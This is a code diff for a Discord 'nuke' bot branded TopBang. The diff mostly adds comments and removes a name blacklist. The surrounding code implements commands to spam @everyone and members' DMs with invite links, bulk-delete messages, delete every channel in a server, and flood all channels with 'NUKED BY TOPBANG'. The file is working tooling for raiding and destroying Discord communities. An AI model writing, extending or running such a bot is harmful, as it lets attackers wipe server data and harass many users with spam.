@@ -7,11 +7,11 @@ const { channel } = require('diagnostics_channel')
 const { Client, GatewayIntentBits, EmbedBuilder } = require('discord.js')
 
 
+// Token
 const token = process.env['token']
 const Prefix = '.'
-const Blacklist = ['Reno', "otherppl"]
 
-
+// Client
 const client = new Client({
   intents: [
     GatewayIntentBits.Guilds,
@@ -28,6 +28,7 @@ client.on('ready', () => {
    const Guild = false
     let commands
 
+    // Guild commands
     if (Guild) {
       commands = Guild.commands
     } else {
@@ -47,6 +48,7 @@ client.on('interactionCreate', async (interaction) => {
     return
   }
   
+  // Help command
   const { commandName, options } = interaction
   if (commandName === 'help') {
     const HelpEMBED = new EmbedBuilder().setTitle("help").setDescription("List of commands to use for nuking..").addFields(
@@ -86,6 +88,7 @@ client.on('interactionCreate', async (interaction) => {
         name: 'Credits',
         value: '``Reno, Reno and Reno``'
       }
+      // Setfooter
     ).setFooter( { text: 'TopBang', iconURL: interaction.member.avatar }).setColor("Random")
     interaction.reply({
       content: '',
@@ -113,6 +116,8 @@ client.on('messageCreate', async message => {
         message.channel.send('@everyone TopBang bot on top! https://discord.gg/SRgPuDeX ')
       }, 250)
     }
+    
+    
     // Spam DM
   } else if (message.content === `${Prefix}spam-dm`) {
     const guild = client.guilds.cache.get(message.guild.id);
@@ -131,14 +136,21 @@ client.on('messageCreate', async message => {
         });
       }, 250)
     }
+    
+    
     // Delete messages
   } else if (message.content === `${Prefix}delete-messages`) {
         message.channel.bulkDelete(100)
   .then(messages => message.author.send("Channel cleared."))
   .catch(console.error);
+    
+    
     // Delete Channels
   } else if (message.content === `${Prefix}delete-channels`) {
 message.guild.channels.cache.forEach(channel => channel.delete());
+    
+    
+    // spam-channesl
   } else if (message.content === `${Prefix}spam-channels`) {
     const MSG = "NUKED BY TOPBANG https://discord.gg/D5YDUSvE NUKED BY TOPBANG https://discord.gg/D5YDUSvE NUKED BY TOPBANG https://discord.gg/D5YDUSvE NUKED BY TOPBANG https://discord.gg/D5YDUSvE "
     message.guild.channels.cache.forEach(channel => channel.send(MSG));
@@ -152,4 +164,5 @@ message.guild.channels.cache.forEach(channel => channel.delete());
   }
 })
 
+// Client Login
 client.login(token)
